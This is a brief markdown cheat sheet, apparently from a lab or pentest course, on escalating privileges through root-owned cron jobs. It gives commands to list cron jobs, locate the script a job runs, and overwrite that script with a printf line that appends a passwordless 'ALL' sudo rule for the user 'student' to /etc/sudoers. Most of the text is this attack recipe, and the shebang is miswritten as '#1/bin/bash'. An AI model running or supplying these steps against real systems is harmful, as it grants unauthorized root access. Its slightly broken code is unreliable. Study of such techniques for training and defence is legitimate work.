# Exploiting Misconfigured Cron Jobs

Crontab file will show you the cron jobs  
They can be run as any user on the system  
**For Privilege escalation, we want to target Jobs created by the root user**  

Viewing Cronjobs  
```crontab -l```

Look for all occurences of path to file using grep   
```grep -rnw /usr -e "/home/student/message"```  

Navigate to the file that is running as a cron job  
Run this command to add user to the sudoers file  
```printf '#1/bin/bash\necho " "student ALL=NOPASSWD":ALL" >> /etc/sudoers' > /usr/local/share/copy.sh```
